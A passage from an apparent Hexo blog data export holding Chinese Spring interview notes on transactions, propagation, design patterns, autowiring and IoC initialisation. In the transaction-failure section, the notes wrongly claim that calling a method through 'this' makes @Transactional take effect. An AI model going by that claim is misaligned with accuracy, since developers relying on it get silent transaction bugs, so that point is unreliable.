class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>TransactionManager</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> PlatformTransactionManager transactionManager;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testTransaction2</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        TransactionStatus status=transactionManager.getTransaction(<span class=\"keyword\">new</span> <span class=\"title class_\">DefaultTransactionDefinition</span>());</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//...业务代码</span></span><br><span class=\"line\">            transactionManager.commit(status);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            transactionManager.rollback(status);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2、注解\"><a href=\"#2、注解\" class=\"headerlink\" title=\"2、注解\"></a>2、注解</h4><ul>\n<li>@Transactional</li>\n</ul>\n<h3 id=\"事务的传播性-Propagation\"><a href=\"#事务的传播性-Propagation\" class=\"headerlink\" title=\"事务的传播性 Propagation\"></a>事务的传播性 Propagation</h3><p>① PROPAGATION_REQUIRED：如果当前没有事务，就创建一个新事务，如果当前存在事务，就加入该事务，该设置是最常用的设置。</p>\n<p>② PROPAGATION_SUPPORTS：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事务执行。</p>\n<p>③ PROPAGATION_MANDATORY：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就抛出异常。</p>\n<p>④ PROPAGATION_REQUIRES_NEW：创建新事务，无论当前存不存在事务，都创建新事务。</p>\n<p>⑤ PROPAGATION_NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。</p>\n<p>⑥ PROPAGATION_NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。</p>\n<p>⑦ PROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则按REQUIRED属性执行。</p>\n<h3 id=\"spring事务失效的场景\"><a href=\"#spring事务失效的场景\" class=\"headerlink\" title=\"spring事务失效的场景\"></a>spring事务失效的场景</h3><ol>\n<li><p>非被Spring管理的Bean上的事务： 如果你在一个非被Spring容器管理的Bean（例如通过new关键字直接创建的对象）上使用事务注解，事务将不会生效。Spring的事务管理是基于AOP（面向切面编程）实现的，因此只能在由Spring容器管理的Bean上起作用。</p>\n</li>\n<li><p>未捕获的异常： 如果在事务内发生未捕获的运行时异常，事务将回滚。但是，如果异常被捕获并在方法内处理，事务可能不会回滚。确保在事务边界内处理异常或者允许异常传播到事务管理器以便正确回滚。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">transactionalMethod</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// some code that may throw an exception</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// handle the exception (not recommended within a transaction)</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>嵌套事务问题： Spring事务支持嵌套事务，但是嵌套事务的行为取决于底层事务管理器的支持。如果使用的事务管理器不支持嵌套事务，嵌套事务可能会被忽略，导致事务行为不一致。</p>\n</li>\n<li><p>方法调用问题： Spring事务是通过AOP实现的，它依赖于代理对象来拦截方法调用并处理事务。如果你在同一个类内部调用一个带有事务注解的方法，事务可能不会起作用，因为代理对象无法拦截内部方法的调用。确保事务注解生效，要么调用方法是通过代理对象，要么通过self-invocation，例如通过this关键字。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyService</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">outerMethod</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        innerMethod(); <span class=\"comment\">// Transactional annotation may not work here</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.innerMethod(); <span class=\"comment\">// Transactional annotation should work here</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Transactional</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">innerMethod</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// some transactional logic</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>异步方法问题： 如果使用了异步方法（通过@Async注解），事务可能会失效。在异步方法内，事务上下文可能无法正确传播，导致事务不起作用。要在异步方法中使用事务，可以使用TransactionContext传播方式。</p>\n</li>\n</ol>\n<h2 id=\"spring使用的设计模式\"><a href=\"#spring使用的设计模式\" class=\"headerlink\" title=\"spring使用的设计模式\"></a>spring使用的设计模式</h2><h3 id=\"简单工厂\"><a href=\"#简单工厂\" class=\"headerlink\" title=\"简单工厂\"></a>简单工厂</h3><p><strong>实现方式：</strong></p>\n<p>BeanFactory。Spring中的BeanFactory就是简单工厂模式的体现，根据传入一个唯一的标识来获得Bean对象，但是否是在传入参数后创建还是传入参数前创建这个要根据具体情况来定。</p>\n<p><strong>实现原理：</strong></p>\n<p>bean容器的启动阶段：</p>\n<p>读取bean的xml配置文件,将bean元素分别转换成一个BeanDefinition对象。<br>然后通过BeanDefinitionRegistry将这些bean注册到beanFactory中，保存在它的一个ConcurrentHashMap中。<br>将BeanDefinition注册到了beanFactory之后，在这里Spring为我们提供了一个扩展的切口，允许我们通过实现接口BeanFactoryPostProcessor<br>在此处来插入我们定义的代码。典型的例子就是：PropertyPlaceholderConfigurer，我们一般在配置数据库的dataSource时使用到的占位符的值，就是它注入进去的。</p>\n<p>容器中bean的实例化阶段：</p>\n<p>实例化阶段主要是通过反射或者CGLIB对bean进行实例化，在这个阶段Spring又给我们暴露了很多的扩展点：</p>\n<p>各种的Aware接口 ，比如 BeanFactoryAware，对于实现了这些Aware接口的bean，在实例化bean时Spring会帮我们注入对应的BeanFactory的实例。 BeanPostProcessor接口<br>，实现了BeanPostProcessor接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 InitializingBean接口<br>，实现了InitializingBean接口的bean，在实例化bean时Spring会帮我们调用接口中的方法。 DisposableBean接口<br>，实现了DisposableBean接口的bean，在该bean死亡时Spring会帮我们调用接口中的方法。</p>\n<p><strong>设计意义：</strong></p>\n<p>松耦合。<br>可以将原来硬编码的依赖，通过Spring这个beanFactory这个工厂来注入依赖，也就是说原来只有依赖方和被依赖方，现在我们引入了第三方——spring这个beanFactory，由它来解决bean之间的依赖问题，达到了松耦合的效果.</p>\n<p>bean的额外处理。 通过Spring接口的暴露，在实例化bean的阶段我们可以进行一些额外的处理，这些额外的处理只需要让bean实现对应的接口即可，那么spring就会在bean的生命周期调用我们实现的接口来处理该bean。[非常重要]</p>\n<h3 id=\"工厂方法\"><a href=\"#工厂方法\" class=\"headerlink\" title=\"工厂方法\"></a>工厂方法</h3><p><strong>实现方式：</strong></p>\n<p>FactoryBean接口。</p>\n<p><strong>实现原理：</strong></p>\n<p>实现了FactoryBean接口的bean是一类叫做factory的bean。其特点是，spring会在使用getBean()调用获得该bean时，会自动调用该bean的getObject()<br>方法，所以返回的不是factory这个bean，而是这个bean.getOjbect()方法的返回值。</p>\n<h3 id=\"单例模式\"><a href=\"#单例模式\" class=\"headerlink\" title=\"单例模式\"></a>单例模式</h3><p>Spring依赖注入Bean实例默认是单例的。</p>\n<p>Spring的依赖注入（包括lazy-init方式）都是发生在AbstractBeanFactory的getBean里。getBean的doGetBean方法调用getSingleton进行bean的创建。</p>\n<h3 id=\"适配器模式\"><a href=\"#适配器模式\" class=\"headerlink\" title=\"适配器模式\"></a>适配器模式</h3><p><strong>实现方式：</strong></p>\n<p>SpringMVC中的适配器HandlerAdatper。</p>\n<p><strong>实现原理：</strong></p>\n<p>HandlerAdatper根据Handler规则执行不同的Handler。</p>\n<p><strong>实现过程：</strong></p>\n<p>DispatcherServlet根据HandlerMapping返回的handler，向HandlerAdatper发起请求，处理Handler。</p>\n<p>HandlerAdapter根据规则找到对应的Handler并让其执行，执行完毕后Handler会向HandlerAdapter返回一个ModelAndView，最后由HandlerAdapter向DispatchServelet返回一个ModelAndView。</p>\n<h3 id=\"装饰器模式\"><a href=\"#装饰器模式\" class=\"headerlink\" title=\"装饰器模式\"></a>装饰器模式</h3><p><strong>实现方式：</strong></p>\n<p>Spring中用到的包装器模式在类名上有两种表现：一种是类名中含有Wrapper，另一种是类名中含有Decorator。</p>\n<p><strong>实质：</strong></p>\n<p>动态地给一个对象添加一些额外的职责。</p>\n<p>就增加功能来说，Decorator模式相比生成子类更为灵活。</p>\n<h3 id=\"代理模式\"><a href=\"#代理模式\" class=\"headerlink\" title=\"代理模式\"></a>代理模式</h3><p><strong>实现方式：</strong></p>\n<p>AOP底层，就是动态代理模式的实现。</p>\n<p><strong>动态代理：</strong></p>\n<p>在内存中构建的，不需要手动编写代理类</p>\n<h2 id=\"spring中properties和yml的加载顺序\"><a href=\"#spring中properties和yml的加载顺序\" class=\"headerlink\" title=\"spring中properties和yml的加载顺序\"></a>spring中properties和yml的加载顺序</h2><p>相同内容properties和yml的加载顺序是properties优先</p>\n<h2 id=\"使用-Autowired注解自动装配的过程是怎样的？\"><a href=\"#使用-Autowired注解自动装配的过程是怎样的？\" class=\"headerlink\" title=\"使用@Autowired注解自动装配的过程是怎样的？\"></a>使用@Autowired注解自动装配的过程是怎样的？</h2><p>使用@Autowired注解来自动装配指定的bean。在使用@Autowired注解之前需要在Spring配置文件进行配置，&lt;context:annotation-config &#x2F;&gt;。</p>\n<p>在启动spring<br>IoC时，容器自动装载了一个AutowiredAnnotationBeanPostProcessor后置处理器，当容器扫描到@Autowied、@Resource或@Inject时，就会在IoC容器自动查找需要的bean，并装配给该对象的属性。在使用@Autowired时，首先在容器中查询对应类型的bean：</p>\n<ul>\n<li>如果查询结果刚好为一个，就将该bean装配给@Autowired指定的数据；</li>\n<li>如果查询的结果不止一个，那么@Autowired会根据名称来查找；</li>\n<li>如果上述查找的结果为空，那么会抛出异常。解决方法是，使用required&#x3D;false。</li>\n</ul>\n<h2 id=\"Autowired和-Resource之间的区别\"><a href=\"#Autowired和-Resource之间的区别\" class=\"headerlink\" title=\"@Autowired和@Resource之间的区别\"></a>@Autowired和@Resource之间的区别</h2><p>@Autowired可用于：构造函数、成员变量、Setter方法</p>\n<p>@Autowired和@Resource之间的区别</p>\n<ul>\n<li>@Autowired默认是按照类型装配注入的，默认情况下它要求依赖对象必须存在（可以设置它required属性为false）。</li>\n<li>@Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入。</li>\n</ul>\n<h2 id=\"Spring中BeanFactory与FactoryBean的区别\"><a href=\"#Spring中BeanFactory与FactoryBean的区别\" class=\"headerlink\" title=\"Spring中BeanFactory与FactoryBean的区别\"></a>Spring中BeanFactory与FactoryBean的区别</h2><h3 id=\"BeanFactory\"><a href=\"#BeanFactory\" class=\"headerlink\" title=\"BeanFactory\"></a>BeanFactory</h3><p>BeanFactory是一个接口，它是Spring中工厂的顶层规范，是SpringIoc容器的核心接口，它定义了getBean()、containsBean()等管理Bean的通用方法。Spring的容器都是它的具体实现如：</p>\n<ul>\n<li>DefaultListableBeanFactory</li>\n<li>XmlBeanFactory</li>\n<li>ApplicationContext</li>\n</ul>\n<p>这些实现类又从不同的维度分别有不同的扩展。</p>\n<h3 id=\"FactoryBean\"><a href=\"#FactoryBean\" class=\"headerlink\" title=\"FactoryBean\"></a>FactoryBean</h3><p>首先它是一个Bean，但又不仅仅是一个Bean。它是一个能生产或修饰对象生成的工厂Bean，类似于设计模式中的工厂模式和装饰器模式。它能在需要的时候生产一个对象，且不仅仅限于它自身，它能返回任何Bean的实例。</p>\n<p>FactoryBean表现的是一个工厂的职责。 即一个Bean A如果实现了FactoryBean接口，那么A就变成了一个工厂，根据A的名称获取到的实际上是工厂调用getObject()<br>返回的对象，而不是A本身，如果要获取工厂A自身的实例，那么需要在名称前面加上’&amp;’符号。</p>\n<ul>\n<li>getObject(‘name’)返回工厂中的实例</li>\n<li>getObject(‘&amp;name’)返回工厂本身的实例</li>\n</ul>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<h1 id=\"spring\"><a href=\"#spring\" class=\"headerlink\" title=\"spring\"></a>spring</h1><h2 id=\"架构图\"><a href=\"#架构图\" class=\"headerlink\" title=\"架构图\"></a>架构图</h2><p><img src=\"/./2024/05/26/Spring%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"结构图\"></p>\n<h2 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h2><h3 id=\"Core-Container\"><a href=\"#Core-Container\" class=\"headerlink\" title=\"Core Container\"></a>Core Container</h3><p>核心容器(Core Container)</p>\n<ul>\n<li><code>spring-beans</code> 该模块是依赖注入IoC与DI的最基本实现</li>\n<li><code>spring-core</code> 该模块是Bean工厂与bean的装配</li>\n<li><code>spring-context</code> 该模块构架于核心模块之上，它扩展了 BeanFactory，为它添加了 Bean 生命周期控制、框架事件体系以及资源加载透明化等功能。ApplicationContext 是该模块的核心接口，它的超类是<br>BeanFactory。与BeanFactory 不同，ApplicationContext 容器实例化后会自动对所有的单实例 Bean 进行实例化与依赖关系的装配，使之处于待用状态</li>\n<li><code>spring-context-indexer</code> 该模块是 Spring 的类管理组件和 Classpath 扫描</li>\n<li><code>spring-context-support</code> 该模块是对 Spring IOC 容器的扩展支持，以及 IOC 子容器</li>\n<li><code>spring-expression</code> 该模块是Spring表达式语言块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也方便的可以调用对象方法、操作数组、集合等</li>\n</ul>\n<h3 id=\"Data-Access-Integration\"><a href=\"#Data-Access-Integration\" class=\"headerlink\" title=\"Data Access&#x2F;Integration\"></a>Data Access&#x2F;Integration</h3><p>数据访问&#x2F;集成</p>\n<ul>\n<li><code>spring-jdbc</code> 该模块提供了 JDBC抽象层，它消除了冗长的 JDBC 编码和对数据库供应商特定错误代码的解析</li>\n<li><code>spring-tx</code> 该模块支持编程式事务和声明式事务，可用于实现了特定接口的类和所有的 POJO 对象。编程式事务需要自己写beginTransaction()、commit()、rollback()<br>等事务管理方法，声明式事务是通过注解或配置由 spring 自动处理，编程式事务粒度更细</li>\n<li><code>spring-orm</code> 该模块提供了对流行的对象关系映射 API的集成，包括 JPA、JDO 和 Hibernate 等。通过此模块可以让这些 ORM 框架和 spring 的其它功能整合，比如前面提及的事务管理</li>\n<li><code>spring-oxm</code> 该模块提供了对 OXM 实现的支持，比如JAXB、Castor、XML Beans、JiBX、XStream等</li>\n<li><code>spring-jms</code> 该模块包含生产（produce）和消费（consume）消息的功能。从Spring 4.1开始，集成了 spring-messaging 模块</li>\n</ul>\n<h3 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h3><p>网络部分</p>\n<ul>\n<li><code>spring-web</code> 该模块为 Spring 提供了最基础 Web 支持，主要建立于核心容器之上，通过 Servlet 或者 Listeners 来初始化 IOC 容器，也包含一些与 Web 相关的支持</li>\n<li><code>spring-webmvc</code> 该模块众所周知是一个的 Web-Servlet 模块，实现了 Spring MVC（model-view-Controller）的 Web 应用</li>\n<li><code>spring-websocket</code> 该模块主要是与 Web 前端的全双工通讯的协议</li>\n<li><code>spring-webflux</code> 该模块是一个新的非堵塞函数式 Reactive Web 框架，可以用来建立异步的，非阻塞，事件驱动的服务，并且扩展性非常好。</li>\n</ul>\n<h3 id=\"面向切面编程-AOP和Aspects\"><a href=\"#面向切面编程-AOP和Aspects\" class=\"headerlink\" title=\"面向切面编程(AOP和Aspects)\"></a>面向切面编程(AOP和Aspects)</h3><ul>\n<li><code>spring-aop</code> 该模块是Spring的另一个核心模块，是 AOP 主要的实现模块</li>\n<li><code>spring-aspects</code> 该模块提供了对 AspectJ 的集成，主要是为 Spring AOP提供多种 AOP 实现方法，如前置方法后置方法等</li>\n</ul>\n<h3 id=\"设备-Instrumentation\"><a href=\"#设备-Instrumentation\" class=\"headerlink\" title=\"设备(Instrumentation)\"></a>设备(Instrumentation)</h3><ul>\n<li><code>spring-instrument</code> 该模块是基于JAVA SE 中的”java.lang.instrument”进行设计的，应该算是 AOP的一个支援模块，主要作用是在 JVM<br>启用时，生成一个代理类，程序员通过代理类在运行时修改类的字节，从而改变一个类的功能，实现 AOP 的功能</li>\n</ul>\n<h3 id=\"消息-Messaging\"><a href=\"#消息-Messaging\" class=\"headerlink\" title=\"消息(Messaging)\"></a>消息(Messaging)</h3><ul>\n<li><code>spring-messaging</code> 是从 Spring4 开始新加入的一个模块，主要职责是为 Spring 框架集成一些基础的报文传送应用</li>\n</ul>\n<h3 id=\"测试-Test\"><a href=\"#测试-Test\" class=\"headerlink\" title=\"测试(Test)\"></a>测试(Test)</h3><ul>\n<li><code>spring-test</code> 主要为测试提供支持的，通过 JUnit 和 TestNG 组件支持单元测试和集成测试。它提供了一致性地加载和缓存 Spring 上下文，也提供了用于单独测试代码的模拟对象（mock object）</li>\n</ul>\n<h2 id=\"IOC\"><a href=\"#IOC\" class=\"headerlink\" title=\"IOC\"></a>IOC</h2><h3 id=\"IOC是什么？\"><a href=\"#IOC是什么？\" class=\"headerlink\" title=\"IOC是什么？\"></a>IOC是什么？</h3><p>控制反转即IoC (Inversion of Control)，它把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的“控制反转”概念就是对组件对象控制权的转移，从程序代码本身转移到了外部容器。</p>\n<p>Spring IOC 负责创建对象，管理对象（通过依赖注入（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。</p>\n<h3 id=\"使用IOC的好处\"><a href=\"#使用IOC的好处\" class=\"headerlink\" title=\"使用IOC的好处\"></a>使用IOC的好处</h3><ul>\n<li>不用自己组装，拿来就用。</li>\n<li>享受单例的好处，效率高，不浪费空间</li>\n<li>便于单元测试，方便切换mock组件</li>\n<li>便于进行AOP操作，对于使用者是透明的</li>\n<li>统一配置，便于修改</li>\n</ul>\n<h2 id=\"BeanFactory-和-ApplicationContext有什么区别\"><a href=\"#BeanFactory-和-ApplicationContext有什么区别\" class=\"headerlink\" title=\"BeanFactory 和 ApplicationContext有什么区别\"></a>BeanFactory 和 ApplicationContext有什么区别</h2><p>BeanFactory和ApplicationContext是Spring的两大核心接口，都可以当做Spring的容器。其中ApplicationContext是BeanFactory的子接口。</p>\n<h3 id=\"依赖关系\"><a href=\"#依赖关系\" class=\"headerlink\" title=\"依赖关系\"></a>依赖关系</h3><p>BeanFactory：是Spring里面最底层的接口，包含了各种Bean的定义，读取bean配置文档，管理bean的加载、实例化，控制bean的生命周期，维护bean之间的依赖关系。</p>\n<p>ApplicationContext接口作为BeanFactory的派生，除了提供BeanFactory所具有的功能外，还提供了更完整的框架功能：</p>\n<ul>\n<li>继承MessageSource，因此支持国际化。</li>\n<li>统一的资源文件访问方式。</li>\n<li>提供在监听器中注册bean的事件。</li>\n<li>同时加载多个配置文件。</li>\n<li>载入多个（有继承关系）上下文 ，使得每一个上下文都专注于一个特定的层次，比如应用的web层。</li>\n</ul>\n<h3 id=\"加载方式\"><a href=\"#加载方式\" class=\"headerlink\" title=\"加载方式\"></a>加载方式</h3><p>BeanFactroy采用的是延迟加载形式来注入Bean的，即只有在使用到某个Bean时(调用getBean())<br>，才对该Bean进行加载实例化。这样，我们就不能发现一些存在的Spring的配置问题。如果Bean的某一个属性没有注入，BeanFacotry加载后，直至第一次使用调用getBean方法才会抛出异常。</p>\n<p>ApplicationContext，它是在容器启动时，一次性创建了所有的Bean。这样，在容器启动时，我们就可以发现Spring中存在的配置错误，这样有利于检查所依赖属性是否注入。<br>ApplicationContext启动后预载入所有的单实例Bean，通过预载入单实例bean ,确保当你需要的时候，你就不用等待，因为它们已经创建好了。</p>\n<p>相对于基本的BeanFactory，ApplicationContext 唯一的不足是占用内存空间。当应用程序配置Bean较多时，程序启动较慢。</p>\n<h3 id=\"创建方式\"><a href=\"#创建方式\" class=\"headerlink\" title=\"创建方式\"></a>创建方式</h3><p>BeanFactory通常以编程的方式被创建，ApplicationContext还能以声明的方式创建，如使用ContextLoader。</p>\n<h3 id=\"注册方式\"><a href=\"#注册方式\" class=\"headerlink\" title=\"注册方式\"></a>注册方式</h3><p>BeanFactory和ApplicationContext都支持BeanPostProcessor、BeanFactoryPostProcessor的使用，但两者之间的区别是：BeanFactory需要手动注册，而ApplicationContext则是自动注册。</p>\n<h3 id=\"Spring-IoC的初始化过程\"><a href=\"#Spring-IoC的初始化过程\" class=\"headerlink\" title=\"Spring IoC的初始化过程\"></a>Spring IoC的初始化过程</h3><h4 id=\"IOC粗略总结\"><a href=\"#IOC粗略总结\" class=\"headerlink\" title=\"IOC粗略总结\"></a>IOC粗略总结</h4><ol>\n<li>首先入口是xml或者注解或者其他形式，要实现beanDefinationReader接口，然后 读取的时候，会将他们解析为bean的定义信息；</li>\n<li>beanFactory在加载bean信息实例化（底层用的反射）之前，spring加了一个接口beanFactoryPostProcessor,用作扩展用。</li>\n<li>beanFactory内部实例化bean之后，在要初始化bean对象之前，增加了一个一系列aware接口，将他的容器，以及工厂都暴露出来供使用者做扩展用。</li>\n<li>经过一些列容器以及容器对象的注入之后，在初始化之前，spring又增加了一个接口 beanPostProcessor,该接口是可以作用于所有创建的bean,在初始化前后，均能通过重写该接口获取bean对象进行定制操作。</li>\n<li>经过实现初始化接口完成初始化功能。</li>\n<li>经过实现销毁接口disposableBean结束其生命。</li>\n</ol>\n<h4 id=\"重要的组件\"><a href=\"#重要的组件\" class=\"headerlink\" title=\"重要的组件\"></a>重要的组件</h4><ul>\n<li><code>BeanDefinition</code> 描述bean的属性的接口，例如bean的scope是单例还是多例，构造方法，有哪些property value，依赖等，相当于对这个bean的一份身份描述<ul>\n<li><h2 id=\"Bean配置-–-BeanDefinition-–-Bean对象\"><a href=\"#Bean配置-–-BeanDefinition-–-Bean对象\" class=\"headerlink\" title=\"Bean配置 –&gt; BeanDefinition –&gt; Bean对象\"></a>Bean配置 –&gt; BeanDefinition –&gt; Bean对象</h2>懒加载情况下，refresh只是把BeanDefinition注册到BeanFactory中，而不是把Bean注册到BeanFactory中。在调用上下文的getBean的时候才会去根据BeanDefinition生成具体的bean对象</li>\n</ul>\n</li>\n<li><code>BeanDefinitionMap</code></li>\n<li><code>BeanFactory</code><ul>\n<li>spring的基础bean容器</li>\n<li>相当于存放所有bean的容器</li>\n</ul>\n</li>\n<li><code>ApplicationContext</code><ul>\n<li>BeanFactory 的子接口，在 BeanFactory 的基础上构建，是相对比较高级的 IoC 容器实现。包含 BeanFactory<br>的所有功能，还提供了其他高级的特性，比如：事件发布、国际化信息支持、统一资源加载策略等。正常情况下，我们都是使用的 ApplicationContext</li>\n<li>相当于丰富了beanfactory的功能，这里理解为上下文就好</li>\n</ul>\n</li>\n<li><code>FactoryBean</code></li>\n</ul>\n<h4 id=\"源码解析\"><a href=\"#源码解析\" class=\"headerlink\" title=\"源码解析\"></a>源码解析</h4><p>首先抛开其他组件的启动，我们只需要引入spring-context就可以启动一个容器了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-context<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>而在springboot出来之前最常见的加载bean的方式是读取配置文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[]args)</span>&#123;</span><br><span class=\"line\">        ApplicationContext context=<span class=\"keyword\">new</span> <span class=\"title class_\">ClassPathXmlApplicationContext</span>(<span class=\"string\">&quot;classpath:applicationfile.xml&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里ApplicationContext是一个接口，主要的实现类有：</p>\n<ul>\n<li>ClassPathXmlApplicationContext 需要一个 xml 配置文件在系统中的路径</li>\n<li>FileSystemXmlApplicationContext 需要一个 xml 配置文件在系统中的路径</li>\n<li>AnnotationConfigApplicationContext 基于注解，大势所趋</li>\n</ul>\n<p>下面的分析都基于 ClassPathXmlApplicationContext 进行分析，因为比较好理解点</p>\n<p>在 resources 目录新建一个配置文件，文件名随意，通常叫 application.xml 或 application-xxx.xml就可以了,对应的类实现一个：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">default-autowire</span>=<span class=\"string\">&quot;byName&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;messageService&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.javadoop.example.MessageServiceImpl&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>main</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 用我们的配置文件来启动一个 ApplicationContext</span></span><br><span class=\"line\">        <span class=\"type\">ApplicationContext</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassPathXmlApplicationContext</span>(<span class=\"string\">&quot;classpath:application.xml&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;context 启动成功&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 从 context 中取出我们的 Bean，而不是用 new MessageServiceImpl() 这种方式</span></span><br><span class=\"line\">        <span class=\"type\">MessageService</span> <span class=\"variable\">messageService</span> <span class=\"operator\">=</span> context.getBean(MessageService.class);</span><br><span class=\"line\">        <span class=\"comment\">// 这句将输出: hello world</span></span><br><span class=\"line\">        System.out.println(messageService.getMessage());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在构造方法中的refresh()方法是启动加载整个容器的关键方法</p>\n<p>方法在springboot容器启动时也会加载,方法为</p>\n<ul>\n<li>org.springframework.boot.SpringApplication#run</li>\n<li>org.springframework.boot.SpringApplication#refreshContext</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">refresh</span><span class=\"params\">()</span><span class=\"keyword\">throws</span> BeansException,IllegalStateException&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 1. 首先是一个synchronized加锁，当然要加锁，不然你先调一次refresh()然后这次还没处理完又调一次，就会乱套了；</span></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (<span class=\"built_in\">this</span>.startupShutdownMonitor)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 2. 这个方法是做准备工作的，记录容器的启动时间、标记“已启动”状态、处理配置文件中的占位符，可以点进去看看，这里就不多说了。</span></span><br><span class=\"line\">        prepareRefresh();</span><br><span class=\"line\"></span><br><span class=\"line\">   